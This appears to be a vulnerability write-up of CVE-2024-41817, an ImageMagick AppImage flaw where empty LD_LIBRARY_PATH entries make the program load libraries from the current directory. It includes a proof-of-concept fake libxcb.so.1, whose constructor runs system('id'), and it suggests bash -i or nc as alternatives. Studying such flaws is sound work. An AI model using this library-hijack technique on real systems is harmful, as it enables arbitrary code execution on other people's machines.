ImageMagick 7.1.1.1-35 : CVE-2024-41817

The AppImage's AppRun script incorrectly constructs MAGICK_CONFIGURE_PATH and LD_LIBRARY_PATH when the corresponding environment variables are unset.

This often results in empty path entries like :: or :/usr/lib, causing ImageMagick to search in the current working directory (CWD) for configuration files or shared libraries.

Source code

 export MAGICK_CONFIGURE_PATH=$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"):$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"):$(readlink -f "$HERE/usr/share/ImageMagick-7"):$(readlink -f "$HERE/usr/etc/ImageMagick-7"):$MAGICK_CONFIGURE_PATH
  
 export LD_LIBRARY_PATH=$(readlink -f "$HERE/usr/lib"):$LD_LIBRARY_PATH 
 export LD_LIBRARY_PATH=${HERE}/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:$LD_LIBRARY_PATH

When the ImageMagick AppImage is launched, its startup script (AppRun) fails to sanitize or correctly set the LD_LIBRARY_PATH environment variable.

If LD_LIBRARY_PATH is unset:

LD_LIBRARY_PATH=:/usr/lib  # This script doesn't have prefix.

This is empty prefix. Therefore, this app will look in the current directory, and then in /usr/lib, when resolving shared libraries.

The colon at the beginning (:) implies an empty prefix. Therefore, this expression is like this...

LD_LIBRARY_PATH=./:/usr/lib

Since LD_LIBRARY_PATH is not set correctly, we can fake it.

Option Meaning
-x c Treat the input as C source code (from stdin)
-shared Build a shared object (.so) instead of executable
-fPIC Generate Position-Independent Code (for linking)
-o libxcb.so.1 Output filename: the fake library you're injecting

C part

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}

__attribute__((constructor)) : tells the compiler to run init() immediately when the library is loaded, before any other function runs.

system("id") : runs the id command (or you could do bash -i, nc, etc.)

exit(0) : exits right after, to avoid crashing the caller
